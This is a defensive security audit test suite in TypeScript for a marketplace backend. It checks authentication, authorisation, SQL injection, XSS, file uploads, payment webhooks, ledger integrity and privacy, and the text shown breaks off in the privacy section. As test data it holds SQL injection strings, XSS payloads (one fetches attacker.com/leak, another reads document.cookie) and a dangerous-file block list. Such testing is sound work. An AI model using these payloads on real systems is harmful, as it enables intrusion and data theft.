/**
 * Phase 18 Defensive Security Audit Test Suite
 * 
 * Verifies defensive controls across 10 security domains:
 * 1. Authentication (Brute force, rate limiting, session handling, password reset replay, email verification)
 * 2. Authorization (IDOR, privilege escalation, role manipulation, object ownership)
 * 3. API Security (Input validation, malformed JSON, mass assignment protection)
 * 4. Database Security (SQL injection resistance, query parameterization)
 * 5. Cross-Site Scripting (XSS sanitization across messages, bios, descriptions, proposals, support)
 * 6. File Uploads (Oversized files, dangerous extensions, unauthorized access)
 * 7. Payment Security (HMAC signature, replay attack, duplicate webhook idempotency, client tampering)
 * 8. Credits Ledger (Negative balance prevention, duplicate claim, duplicate refund, race condition protection)
 * 9. Chat Security (Conversation isolation, 403 unauthorized access)
 * 10. Identity Privacy (Payload inspection ensuring 0 client/developer PII leaks)
 */

import app from '../server.js';
import { query, withTransaction } from '../database/db.js';
import { env } from '../config/environment.js';
import { ROLES } from '../config/constants.js';
import { BruteForceProtection } from '../middlewares/rateLimiter.js';
import { ProjectService } from '../services/projectService.js';
import { WorkspaceService } from '../services/workspaceService.js';
import { CreditLedgerService } from '../services/creditLedgerService.js';
import { ChatService } from '../services/chatService.js';
import { SupportService } from '../services/supportService.js';
import { DeveloperService } from '../services/developerService.js';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import { Server } from 'http';

interface AuditDomainResult {
  domain: string;
  passed: boolean;
  checks: string[];
  findings?: string[];
}

export async function runSecurityAudit(): Promise<Record<string, AuditDomainResult>> {
  console.log('================================================================');
  console.log('STARTING PHASE 18: DEFENSIVE SECURITY AUDIT & VERIFICATION');
  console.log('================================================================\n');

  let server: Server | null = null;
  let baseUrl = '';

  const results: Record<string, AuditDomainResult> = {
    authentication: { domain: 'Authentication', passed: false, checks: [] },
    authorization: { domain: 'Authorization & RBAC', passed: false, checks: [] },
    api: { domain: 'API & Input Validation', passed: false, checks: [] },
    database: { domain: 'Database & SQLi Defense', passed: false, checks: [] },
    xss: { domain: 'Cross-Site Scripting (XSS)', passed: false, checks: [] },
    fileUploads: { domain: 'File Uploads & Types', passed: false, checks: [] },
    payments: { domain: 'Payment Gateway Security', passed: false, checks: [] },
    credits: { domain: 'Credits Ledger & Race Conditions', passed: false, checks: [] },
    chat: { domain: 'Chat & Conversation Isolation', passed: false, checks: [] },
    privacy: { domain: 'Identity Privacy & Data Leaks', passed: false, checks: [] },
  };

  try {
    // 0. Spin up test server on ephemeral port
    await new Promise<void>((resolve) => {
      server = app.listen(0, () => {
        const port = (server?.address() as any).port;
        baseUrl = `http://127.0.0.1:${port}`;
        console.log(`[Audit Harness] Security audit test server listening at ${baseUrl}`);
        resolve();
      });
    });

    const suffix = `sec_${Date.now()}`;
    const pwdHash = await bcrypt.hash('AuditedPassword2026!', 8);

    // -------------------------------------------------------------------------
    // TEST DOMAIN 1: AUTHENTICATION
    // -------------------------------------------------------------------------
    console.log('\n--- [1/10] AUDITING AUTHENTICATION DEFENSES ---');
    BruteForceProtection.resetAll();

    // 1.1 Brute-force lockout
    const targetEmail = `bruteforce.${suffix}@audit.dev`;
    await query(
      `INSERT INTO users (email, password_hash, role, status) VALUES ($1, $2, 'DEVELOPER', 'ACTIVE')`,
      [targetEmail, pwdHash]
    );

    let lockoutTriggered = false;
    for (let i = 1; i <= 6; i++) {
      const resp = await fetch(`${baseUrl}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: targetEmail, password: 'WrongPassword!' }),
      });
      if (resp.status === 429) {
        lockoutTriggered = true;
        break;
      }
    }

    if (!lockoutTriggered) {
      throw new Error('Brute-force protection failed: Account was not locked after 5 consecutive failures');
    }
    results.authentication.checks.push('✔ Brute-force protection: 5 consecutive failed logins trigger 429 lockout');
    BruteForceProtection.resetAll(); // Clear for remaining test suite

    // 1.2 Rate limiting headers
    const healthResp = await fetch(`${baseUrl}/api/auth/me`);
    const rateLimitLimit = healthResp.headers.get('x-ratelimit-limit');
    const rateLimitRemaining = healthResp.headers.get('x-ratelimit-remaining');
    if (!rateLimitLimit && !rateLimitRemaining) {
      // General API check
      const apiResp = await fetch(`${baseUrl}/api/projects/public/search?q=test`);
      if (!apiResp.headers.get('x-ratelimit-limit')) {
        throw new Error('Rate limiting headers missing from API responses');
      }
    }
    results.authentication.checks.push('✔ Rate limiting headers: X-RateLimit-Limit and X-RateLimit-Remaining enforced');

    // 1.3 Session handling
    const expiredToken = jwt.sign(
      { userId: 'test-user', email: targetEmail, role: ROLES.DEVELOPER },
      env.JWT_SECRET,
      { expiresIn: '-10s' }
    );
    const expiredResp = await fetch(`${baseUrl}/api/auth/me`, {
      headers: { Authorization: `Bearer ${expiredToken}` },
    });
    if (expiredResp.status !== 401) {
      throw new Error(`Expired JWT token returned status ${expiredResp.status} instead of 401`);
    }

    const forgedToken = jwt.sign(
      { userId: 'test-user', email: targetEmail, role: ROLES.CEO },
      'wrong_untrusted_secret'
    );
    const forgedResp = await fetch(`${baseUrl}/api/auth/me`, {
      headers: { Authorization: `Bearer ${forgedToken}` },
    });
    if (forgedResp.status !== 401) {
      throw new Error(`Forged signature JWT returned status ${forgedResp.status} instead of 401`);
    }
    results.authentication.checks.push('✔ Session handling: Expired and tampered tokens strictly rejected with 401');

    // 1.4 Password reset single-use token lifecycle
    const forgotResp = await fetch(`${baseUrl}/api/auth/forgot-password`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: targetEmail }),
    });
    const forgotData = (await forgotResp.json()) as any;
    const resetToken = forgotData.resetToken;
    if (!resetToken) throw new Error('Failed to obtain reset token');

    // First use: Should succeed
    const reset1 = await fetch(`${baseUrl}/api/auth/reset-password`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ resetToken, newPassword: 'NewSecurePassword2026!' }),
    });
    if (reset1.status !== 200) {
      throw new Error(`Initial password reset failed with status ${reset1.status}`);
    }

    // Second use: Must be rejected (single-use protection)
    const reset2 = await fetch(`${baseUrl}/api/auth/reset-password`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ resetToken, newPassword: 'AnotherPassword2026!' }),
    });
    if (reset2.status !== 400) {
      throw new Error(`Password reset token reuse was NOT rejected! Status: ${reset2.status}`);
    }
    results.authentication.checks.push('✔ Password reset single-use: Replay attempt of consumed token rejected with 400');

    // 1.5 Email verification
    const emailSendResp = await fetch(`${baseUrl}/api/auth/send-verification-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: targetEmail }),
    });
    const emailSendData = (await emailSendResp.json()) as any;
    const verifyToken = emailSendData.verificationToken;

    const emailVerifyResp = await fetch(`${baseUrl}/api/auth/verify-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: verifyToken }),
    });
    if (emailVerifyResp.status !== 200) {
      throw new Error(`Email verification failed with status ${emailVerifyResp.status}`);
    }

    const tamperedVerify = await fetch(`${baseUrl}/api/auth/verify-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: verifyToken + 'tamper' }),
    });
    if (tamperedVerify.status !== 401) {
      throw new Error(`Tampered email verification token accepted with status ${tamperedVerify.status}`);
    }
    results.authentication.checks.push('✔ Email verification: Valid token verified; tampered token rejected with 401');
    results.authentication.passed = true;

    // -------------------------------------------------------------------------
    // TEST DOMAIN 2: AUTHORIZATION & RBAC
    // -------------------------------------------------------------------------
    console.log('\n--- [2/10] AUDITING AUTHORIZATION & RBAC DEFENSES ---');

    // Setup Client 1, Client 2, Dev 1, Dev 2
    const c1UserRes = await query(
      `INSERT INTO users (email, password_hash, role, status) VALUES ($1, $2, 'CLIENT', 'ACTIVE') RETURNING id`,
      [`c1.${suffix}@test.dev`, pwdHash]
    );
    const c1IdRes = await query(
      `INSERT INTO clients (user_id, client_number, company_name, private_name) VALUES ($1, $2, 'Client One Inc', 'Alice Client') RETURNING id`,
      [c1UserRes.rows[0].id, `Client #101-${suffix}`]
    );
    const client1Id = c1IdRes.rows[0].id;
    const client1Token = jwt.sign(
      { userId: c1UserRes.rows[0].id, email: `c1.${suffix}@test.dev`, role: ROLES.CLIENT, clientId: client1Id },
      env.JWT_SECRET
    );

    const c2UserRes = await query(
      `INSERT INTO users (email, password_hash, role, status) VALUES ($1, $2, 'CLIENT', 'ACTIVE') RETURNING id`,
      [`c2.${suffix}@test.dev`, pwdHash]
    );
    const c2IdRes = await query(
      `INSERT INTO clients (user_id, client_number, company_name, private_name) VALUES ($1, $2, 'Client Two Inc', 'Bob Client') RETURNING id`,
      [c2UserRes.rows[0].id, `Client #102-${suffix}`]
    );
    const client2Id = c2IdRes.rows[0].id;
    const client2Token = jwt.sign(
      { userId: c2UserRes.rows[0].id, email: `c2.${suffix}@test.dev`, role: ROLES.CLIENT, clientId: client2Id },
      env.JWT_SECRET
    );

    const d1UserRes = await query(
      `INSERT INTO users (email, password_hash, role, status) VALUES ($1, $2, 'DEVELOPER', 'ACTIVE') RETURNING id`,
      [`d1.${suffix}@test.dev`, pwdHash]
    );
    const d1IdRes = await query(
      `INSERT INTO developers (user_id, username, display_name, role_title, experience, verification_status) VALUES ($1, $2, 'Dev One', 'Fullstack Dev', 5, 'VERIFIED') RETURNING id`,
      [d1UserRes.rows[0].id, `dev1-${suffix}`]
    );
    const dev1Id = d1IdRes.rows[0].id;
    await query(`INSERT INTO credit_accounts (developer_id, balance) VALUES ($1, 5)`, [dev1Id]);
    const dev1Token = jwt.sign(
      { userId: d1UserRes.rows[0].id, email: `d1.${suffix}@test.dev`, role: ROLES.DEVELOPER, developerId: dev1Id },
      env.JWT_SECRET
    );

    const d2UserRes = await query(
      `INSERT INTO users (email, password_hash, role, status) VALUES ($1, $2, 'DEVELOPER', 'ACTIVE') RETURNING id`,
      [`d2.${suffix}@test.dev`, pwdHash]
    );
    const d2IdRes = await query(
      `INSERT INTO developers (user_id, username, display_name, role_title, experience, verification_status) VALUES ($1, $2, 'Dev Two', 'Backend Dev', 4, 'VERIFIED') RETURNING id`,
      [d2UserRes.rows[0].id, `dev2-${suffix}`]
    );
    const dev2Id = d2IdRes.rows[0].id;
    await query(`INSERT INTO credit_accounts (developer_id, balance) VALUES ($1, 5)`, [dev2Id]);
    const dev2Token = jwt.sign(
      { userId: d2UserRes.rows[0].id, email: `d2.${suffix}@test.dev`, role: ROLES.DEVELOPER, developerId: dev2Id },
      env.JWT_SECRET
    );

    // Create Project 1 owned by Client 1
    const p1Res = await query(
      `INSERT INTO projects (
         project_number, slug, title, description, category,
         budget_min, budget_max, timeline, status, claim_cost, max_claims,
         claim_deadline, client_id
       ) VALUES ($1, $2, 'Secure FinTech Hub', 'Private financial engine', 'FINTECH', 100000, 200000, '30 Days', 'OPEN_FOR_CLAIMS', 1, 5, NOW() + INTERVAL '7 days', $3)
       RETURNING id`,
      [`PRJ-2026-901-${suffix}`, `fintech-${suffix}`, client1Id]
    );
    const proj1Id = p1Res.rows[0].id;

    // 2.1 IDOR Prevention: Client 2 attempts to access Client 1's project workspace
    const idorResp = await fetch(`${baseUrl}/api/workspace/${proj1Id}`, {
      headers: { Authorization: `Bearer ${client2Token}` },
    });
    if (idorResp.status !== 403) {
      throw new Error(`IDOR vulnerability: Client 2 accessed Client 1 workspace! Status: ${idorResp.status}`);
    }
    results.authorization.checks.push('✔ IDOR prevention: Client 2 blocked from accessing Client 1 project workspace (403)');

    // 2.2 Privilege Escalation: Developer/Client cannot call Admin routes
    const adminEscResp1 = await fetch(`${baseUrl}/api/admin/metrics`, {
      headers: { Authorization: `Bearer ${dev1Token}` },
    });
    const adminEscResp2 = await fetch(`${baseUrl}/api/admin/metrics`, {
      headers: { Authorization: `Bearer ${client1Token}` },
    });
    if (adminEscResp1.status !== 403 || adminEscResp2.status !== 403) {
      throw new Error(`Privilege escalation vulnerability: Non-admin accessed /api/admin/metrics! Dev: ${adminEscResp1.status}, Client: ${adminEscResp2.status}`);
    }
    results.authorization.checks.push('✔ Privilege escalation defense: Developer and Client blocked from executive admin routes (403)');

    // 2.3 Role manipulation defense: Injected role payload during registration
    const roleInjectResp = await fetch(`${baseUrl}/api/auth/register-client`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: `hacker.${suffix}@nexus.dev`,
        password: 'Password123!',
        companyName: 'Evil Corp',
        privateName: 'Mr. Robot',
        role: 'CEO', // Attacker attempts to forge CEO role
      }),
    });
    await roleInjectResp.json();
    const forgedUser = await query(`SELECT role FROM users WHERE email = $1`, [`hacker.${suffix}@nexus.dev`]);
    if (forgedUser.rows.length > 0 && forgedUser.rows[0].role === 'CEO') {
      throw new Error('Role manipulation vulnerability: Attacker successfully registered as CEO!');
    }
    results.authorization.checks.push('✔ Role manipulation defense: Injected role payloads in registration ignored; hardcoded CLIENT role assigned');

    // 2.4 Object ownership: Developer 2 cannot upload files to Project 1 without membership
    const unauthUploadResp = await fetch(`${baseUrl}/api/workspace/${proj1Id}/files`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${dev2Token}`,
      },
      body: JSON.stringify({
        fileName: 'unauthorized_patch.pdf',
        fileUrl: 'https://storage.nexus.dev/unauth.pdf',
        fileSize: 1024,
        mimeType: 'application/pdf',
      }),
    });
    if (unauthUploadResp.status !== 403) {
      throw new Error(`Object ownership failure: Unrelated developer uploaded file to unassigned project! Status: ${unauthUploadResp.status}`);
    }
    results.authorization.checks.push('✔ Object ownership: Unassigned developer cannot upload deliverable files to project (403)');
    results.authorization.passed = true;

    // -------------------------------------------------------------------------
    // TEST DOMAIN 3: API & INPUT VALIDATION
    // -------------------------------------------------------------------------
    console.log('\n--- [3/10] AUDITING API & INPUT VALIDATION DEFENSES ---');

    // 3.1 Input validation: Missing required fields
    const emptyLoginResp = await fetch(`${baseUrl}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: '' }),
    });
    if (emptyLoginResp.status !== 400) {
      throw new Error(`Input validation failed: Empty login payload returned ${emptyLoginResp.status} instead of 400`);
    }
    results.api.checks.push('✔ Input validation: Missing required parameters strictly rejected with 400');

    // 3.2 Malformed requests: Syntactically invalid JSON payload
    const malformedResp = await fetch(`${baseUrl}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{"email": "broken_json@test.com", "password":',
    });
    if (malformedResp.status !== 400) {
      throw new Error(`Malformed JSON request returned status ${malformedResp.status} instead of 400`);
    }
    results.api.checks.push('✔ Malformed requests: Broken JSON syntax safely intercepted with 400 Bad Request');

    // 3.3 Mass assignment protection: Unexpected fields injected into updateProfile
    await fetch(`${baseUrl}/api/developers/profile`, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${dev1Token}`,
      },
      body: JSON.stringify({
        displayName: 'Dev One Updated',
        balance: 999999, // Attempted mass assignment
        verification_status: 'SUPER_ADMIN',
      }),
    });
    const devAccountCheck = await query(`SELECT balance FROM credit_accounts WHERE developer_id = $1`, [dev1Id]);
    if (devAccountCheck.rows[0].balance > 10) {
      throw new Error('Mass assignment vulnerability: Attacker modified balance via profile update!');
    }
    results.api.checks.push('✔ Mass assignment defense: Injected balance/status attributes safely ignored during updates');
    results.api.passed = true;

    // -------------------------------------------------------------------------
    // TEST DOMAIN 4: DATABASE & SQL INJECTION DEFENSE
    // -------------------------------------------------------------------------
    console.log('\n--- [4/10] AUDITING DATABASE & SQL INJECTION DEFENSES ---');

    const sqliPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE non_existent_test; --",
      "' UNION SELECT '1', '2', '3' --",
      "1; SELECT pg_sleep(0.1); --",
    ];

    for (const sqli of sqliPayloads) {
      const sqliSearchResp = await fetch(`${baseUrl}/api/projects/public/search?q=${encodeURIComponent(sqli)}`);
      if (sqliSearchResp.status >= 500) {
        throw new Error(`SQL injection vulnerability or unhandled syntax error on payload: ${sqli}`);
      }

      const sqliDevResp = await fetch(`${baseUrl}/api/developers/directory?search=${encodeURIComponent(sqli)}`);
      if (sqliDevResp.status >= 500) {
        throw new Error(`SQL injection vulnerability on developer search for payload: ${sqli}`);
      }
    }

    // Verify database tables exist and are untouched
    const tableCheck = await query(`SELECT COUNT(*) FROM users`);
    if (parseInt(tableCheck.rows[0].count, 10) === 0) {
      throw new Error('Database integrity violated after SQLi audit probes');
    }
    results.database.checks.push('✔ SQL Injection protection: Parameterized queries neutralize boolean, union, and stacked SQLi payloads');
    results.database.passed = true;

    // -------------------------------------------------------------------------
    // TEST DOMAIN 5: CROSS-SITE SCRIPTING (XSS)
    // -------------------------------------------------------------------------
    console.log('\n--- [5/10] AUDITING CROSS-SITE SCRIPTING (XSS) DEFENSES ---');

    // Dev 1 claims Project 1 to establish conversation
    const claimRes = await ProjectService.claimProject(proj1Id, dev1Id, d1UserRes.rows[0].id);
    const convId = claimRes.conversationId;

    // 5.1 Chat messages sanitization
    const xssChatMessage = `<script>alert('XSS_CHAT')</script><img src=x onerror=alert('img_onerror')>Hello Client`;
    await ChatService.sendMessage(convId, d1UserRes.rows[0].id, xssChatMessage);

    const chatMessages = await query(`SELECT message FROM messages WHERE conversation_id = $1 ORDER BY created_at DESC LIMIT 1`, [convId]);
    const storedMsg = chatMessages.rows[0].message;
    if (storedMsg.includes('<script>') || storedMsg.includes('onerror=')) {
      throw new Error(`XSS vulnerability in chat messages: Malicious payload was stored unsanitized: ${storedMsg}`);
    }
    results.xss.checks.push('✔ Chat messages: Script tags and inline event handlers stripped from conversation messages');

    // 5.2 Project descriptions sanitization
    const submittedProj = await ProjectService.submitProject(
      client1Id,
      c1UserRes.rows[0].id,
      {
        title: `Safe Project Title <script>alert('XSS_TITLE')</script>`,
        description: `Legitimate project description <script>window.location='https://evil.com'</script>`,
        category: 'SECURITY',
        budgetMin: 50000,
        budgetMax: 80000,
        timeline: '14 Days',
        requirements: [],
        requiredTechnologies: [],
      }
    );
    const projCheck = await query(`SELECT title, description FROM projects WHERE id = $1`, [submittedProj.projectId]);
    if (projCheck.rows[0].title.includes('<script>') || projCheck.rows[0].description.includes('<script>')) {
      throw new Error('XSS vulnerability in project submission: Script tag stored in title or description');
    }
    results.xss.checks.push('✔ Project descriptions: Malicious scripts stripped from project submissions');

    // 5.3 Developer bio sanitization
    await DeveloperService.updateProfile(dev1Id, {
      bio: `Senior systems architect <script>stealAuthToken()</script> specialising in security`,
    });
    const devBioCheck = await query(`SELECT bio FROM developers WHERE id = $1`, [dev1Id]);
    if (devBioCheck.rows[0].bio.includes('<script>')) {
      throw new Error('XSS vulnerability in developer bio: Script tag persisted in bio');
    }
    results.xss.checks.push('✔ Developer bio: Executable scripts neutralized in profile updates');

    // 5.4 Proposal sanitization
    await ProjectService.submitProposal(proj1Id, dev1Id, {
      approach: `Microservices design <script>fetch('http://attacker.com/leak')</script>`,
      timeline: '2 weeks',
      price: 150000,
    });
    const propCheck = await query(
      `SELECT approach FROM proposals p JOIN project_claims pc ON p.project_claim_id = pc.id WHERE pc.project_id = $1`,
      [proj1Id]
    );
    if (propCheck.rows[0].approach.includes('<script>')) {
      throw new Error('XSS vulnerability in proposal approach: Script tag persisted in proposal');
    }
    results.xss.checks.push('✔ Proposal submission: Malicious approach scripts sanitized prior to client review');

    // 5.5 Support tickets sanitization
    const supportTicket = await SupportService.createTicket(
      client1Id,
      c1UserRes.rows[0].id,
      proj1Id,
      `Ticket Subject <script>alert(1)</script>`,
      `Issue description <script>alert(document.cookie)</script>`
    );
    const ticketCheck = await query(`SELECT subject, description FROM support_tickets WHERE id = $1`, [supportTicket.id]);
    if (ticketCheck.rows[0].subject.includes('<script>') || ticketCheck.rows[0].description.includes('<script>')) {
      throw new Error('XSS vulnerability in support tickets: Script tag persisted in support ticket');
    }
    results.xss.checks.push('✔ Support tickets: Malicious scripts sanitized in ticket creation');
    results.xss.passed = true;

    // -------------------------------------------------------------------------
    // TEST DOMAIN 6: FILE UPLOADS & TYPES
    // -------------------------------------------------------------------------
    console.log('\n--- [6/10] AUDITING FILE UPLOAD DEFENSES ---');

    // 6.1 Oversized file rejection (>50MB)
    let oversizedRejected = false;
    try {
      await WorkspaceService.uploadFile(
        proj1Id,
        { userId: c1UserRes.rows[0].id, role: ROLES.CLIENT, clientId: client1Id },
        {
          fileName: 'oversized_dump.zip',
          fileUrl: 'https://storage.nexus.dev/huge.zip',
          fileSize: 55 * 1024 * 1024, // 55 MB
          mimeType: 'application/zip',
        }
      );
    } catch (err: any) {
      if (err.message.includes('50 MB')) oversizedRejected = true;
    }
    if (!oversizedRejected) {
      throw new Error('File upload defense failed: 55MB file was NOT rejected!');
    }
    results.fileUploads.checks.push('✔ Oversized file defense: Payloads exceeding 50MB rejected');

    // 6.2 Dangerous file type rejection
    const dangerousFiles = [
      { name: 'exploit.exe', mime: 'application/x-msdownload' },
      { name: 'shell.sh', mime: 'application/x-sh' },
      { name: 'script.bat', mime: 'application/x-bat' },
      { name: 'backdoor.php', mime: 'application/x-php' },
      { name: 'trojan.py', mime: 'text/x-python' },
    ];

    let dangerousCount = 0;
    for (const file of dangerousFiles) {
      try {
        await WorkspaceService.uploadFile(
          proj1Id,
          { userId: c1UserRes.rows[0].id, role: ROLES.CLIENT, clientId: client1Id },
          {
            fileName: file.name,
            fileUrl: `https://storage.nexus.dev/${file.name}`,
            fileSize: 1024,
            mimeType: file.mime,
          }
        );
      } catch (err: any) {
        if (err.message.includes('prohibited') || err.message.includes('Unsupported')) {
          dangerousCount++;
        }
      }
    }
    if (dangerousCount !== dangerousFiles.length) {
      throw new Error(`Dangerous file upload vulnerability: Only ${dangerousCount}/${dangerousFiles.length} malicious extensions were blocked`);
    }
    results.fileUploads.checks.push('✔ Dangerous file extensions: Executable extensions (.exe, .sh, .bat, .php, .py) blocked');

    // 6.3 Unauthorized file access: Developer 2 cannot access Project 1 files
    const fileAccessResp = await fetch(`${baseUrl}/api/workspace/${proj1Id}/files`, {
      headers: { Authorization: `Bearer ${dev2Token}` },
    });
    if (fileAccessResp.status !== 403) {
      throw new Error(`Unauthorized file access allowed: Status ${fileAccessResp.status}`);
    }
    results.fileUploads.checks.push('✔ Deliverable files access: Unauthorized developers blocked from project file repository (403)');
    results.fileUploads.passed = true;

    // -------------------------------------------------------------------------
    // TEST DOMAIN 7: PAYMENT GATEWAY SECURITY
    // -------------------------------------------------------------------------
    console.log('\n--- [7/10] AUDITING PAYMENT GATEWAY SECURITY ---');

    // Create a mock payment order in DB
    const gatewayPaymentId = `pay_order_${Date.now()}_${suffix}`;
    await query(
      `INSERT INTO payments (
         user_id, amount, currency, gateway, gateway_payment_id, status, metadata
       ) VALUES ($1, 500, 'INR', 'STRIPE_TEST', $2, 'PENDING', $3)
       RETURNING id`,
      [d1UserRes.rows[0].id, gatewayPaymentId, JSON.stringify({ developerId: dev1Id, credits: 10 })]
    );

    const validPayload = JSON.stringify({
      event: 'payment.success',
      timestamp: Date.now(),
      data: {
        gatewayPaymentId: gatewayPaymentId,
        developerId: dev1Id,
        credits: 10,
      },
    });

    const validSignature = crypto
      .createHmac('sha256', env.PAYMENT_WEBHOOK_SECRET)
      .update(validPayload)
      .digest('hex');

    // 7.1 Webhook cryptographic signature verification
    const invalidSigResp = await fetch(`${baseUrl}/api/credits/webhook`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-nexus-signature': 'invalid_forged_signature_000000',
      },
      body: validPayload,
    });
    if (invalidSigResp.status !== 401 && invalidSigResp.status !== 400) {
      throw new Error(`Forged webhook signature was accepted! Status: ${invalidSigResp.status}`);
    }
    results.payments.checks.push('✔ Webhook cryptographic verification: Forged HMAC-SHA256 signature rejected');

    // 7.2 Webhook processing & idempotency
    const validWebhookResp1 = await fetch(`${baseUrl}/api/credits/webhook`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-nexus-signature': validSignature,
      },
      body: validPayload,
    });
    if (validWebhookResp1.status !== 200) {
      const errText = await validWebhookResp1.text();
      throw new Error(`Valid webhook failed to process: Status ${validWebhookResp1.status} - ${errText}`);
    }

    // Send duplicate identical webhook
    const validWebhookResp2 = await fetch(`${baseUrl}/api/credits/webhook`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-nexus-signature': validSignature,
      },
      body: validPayload,
    });
    const dupResult = (await validWebhookResp2.json()) as any;
    if (!dupResult.duplicate) {
      throw new Error('Payment webhook idempotency failure: Duplicate event did NOT return duplicate: true');
    }
    results.payments.checks.push('✔ Webhook idempotency: Duplicate webhook acknowledged safely without double-crediting wallet');

    // 7.3 Replay protection (expired timestamp)
    const expiredPayload = JSON.stringify({
      event: 'payment.success',
      timestamp: Date.now() - (600 * 1000), // 10 minutes ago (> 300s)
      data: {
        gatewayPaymentId: `pay_order_replay_${suffix}`,
        developerId: dev1Id,
        credits: 10,
      },
    });
    const expiredSignature = crypto
      .createHmac('sha256', env.PAYMENT_WEBHOOK_SECRET)
      .update(expiredPayload)
      .digest('hex');

    const replayResp = await fetch(`${baseUrl}/api/credits/webhook`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-nexus-signature': expiredSignature,
      },
      body: expiredPayload,
    });
    if (replayResp.status !== 400) {
      throw new Error(`Replay attack payload (>300s old) was NOT rejected! Status: ${replayResp.status}`);
    }
    results.payments.checks.push('✔ Webhook replay attack protection: Stale timestamps (>300s) rejected with 400');

    // 7.4 Client-side payment tampering prevention
    const clientTamperResp = await fetch(`${baseUrl}/api/credits/payment/verify-client`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${dev1Token}` },
    });
    if (clientTamperResp.status !== 403) {
      throw new Error(`Direct client payment mutation was not blocked! Status: ${clientTamperResp.status}`);
    }
    results.payments.checks.push('✔ Direct payment tampering defense: Client-side mutation rejected with SEC_UNAUTHORIZED_PAYMENT_MUTATION');
    results.payments.passed = true;

    // -------------------------------------------------------------------------
    // TEST DOMAIN 8: CREDITS LEDGER & RACE CONDITIONS
    // -------------------------------------------------------------------------
    console.log('\n--- [8/10] AUDITING CREDITS LEDGER & RACE CONDITIONS ---');

    // 8.1 Negative balance prevention via database check constraint
    let negativeBalanceBlocked = false;
    try {
      await withTransaction(async (client) => {
        await client.query(
          `UPDATE credit_accounts SET balance = balance - 99999 WHERE developer_id = $1`,
          [dev2Id]
        );
      });
    } catch (err: any) {
      if (err.message.includes('check constraint') || err.message.includes('violates') || err.message.includes('balance')) {
        negativeBalanceBlocked = true;
      }
    }
    if (!negativeBalanceBlocked) {
      throw new Error('Database check constraint failed: Negative credit balance was allowed!');
    }
    results.credits.checks.push('✔ Negative balance protection: DB check constraint (balance >= 0) prevents overdraft');

    // 8.2 Duplicate claim prevention
    let duplicateClaimBlocked = false;
    try {
      await ProjectService.claimProject(proj1Id, dev1Id, d1UserRes.rows[0].id);
    } catch (err: any) {
      if (err.message.includes('already claimed') || err.message.includes('unique') || err.message.includes('Claim')) {
        duplicateClaimBlocked = true;
      }
    }
    if (!duplicateClaimBlocked) {
      throw new Error('Duplicate claim allowed: Developer claimed the same project twice!');
    }
    results.credits.checks.push('✔ Duplicate claim prevention: UNIQUE(project_id, developer_id) prevents double claim');

    // 8.3 Duplicate refund prevention
    // Select Dev 1 on Project 1
    await ProjectService.selectDeveloper(proj1Id, dev1Id, client1Id);

    // Call refund on unselected developers
    await CreditLedgerService.processSelectionRefunds(proj1Id, dev1Id);
    // Duplicate refund call: must be 0 additional refunds
    const refundResult2 = await CreditLedgerService.processSelectionRefunds(proj1Id, dev1Id);
    if (refundResult2.refundedDevelopersCount !== 0) {
      throw new Error(`Duplicate refund vulnerability: Second refund run refunded ${refundResult2.refundedDevelopersCount} developers!`);
    }
    results.credits.checks.push('✔ Duplicate refund prevention: Idempotent ledger transactions prevent repeat refunds');
    results.credits.passed = true;

    // -------------------------------------------------------------------------
    // TEST DOMAIN 9: CHAT & CONVERSATION ISOLATION
    // -------------------------------------------------------------------------
    console.log('\n--- [9/10] AUDITING CHAT & CONVERSATION ISOLATION ---');

    // Dev 2 attempts to read messages in Dev 1's conversation (convId)
    const unauthorizedRead = await fetch(`${baseUrl}/api/chat/${convId}/messages`, {
      headers: { Authorization: `Bearer ${dev2Token}` },
    });
    if (unauthorizedRead.status !== 403) {
      throw new Error(`Unauthorized conversation read allowed: Status ${unauthorizedRead.status}`);
    }

    // Dev 2 attempts to send a message to Dev 1's conversation
    const unauthorizedSend = await fetch(`${baseUrl}/api/chat/${convId}/messages`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${dev2Token}`,
      },
      body: JSON.stringify({ message: 'I should not be able to post here' }),
    });
    if (unauthorizedSend.status !== 403) {
      throw new Error(`Unauthorized conversation message injection allowed: Status ${unauthorizedSend.status}`);
    }
    results.chat.checks.push('✔ Conversation isolation: Non-participant developer blocked from reading conversation (403)');
    results.chat.checks.push('✔ Message injection defense: Non-participant developer blocked from sending messages (403)');
    results.chat.passed = true;

    // -------------------------------------------------------------------------
    // TEST DOMAIN 10: IDENTITY PRIVACY & ZERO DATA LEAK
    // -------------------------------------------------------------------------
    console.log('\n--- [10/10] AUDITING IDENTITY PRIVACY & DATA LEAKAGE ---');

    // 10.1 Inspect project claims API payload returned to developer
    const claimsInspectionResp = await fetch(`${baseUrl}/api/projects/${proj1Id}`, {
      headers: { Authorization: `Bearer ${dev1Token}` },
    });
    const projData = await claimsInspectionResp.json();
    const projPayloadStr = JSON.stringify(projData);

    let clientLeaks = 0;
    if (projPayloadStr.includes('Alice Client')) clientLeaks++;
    if (projPayloadStr.includes(`c1.${suffix}@test.dev`)) clientLeaks++;
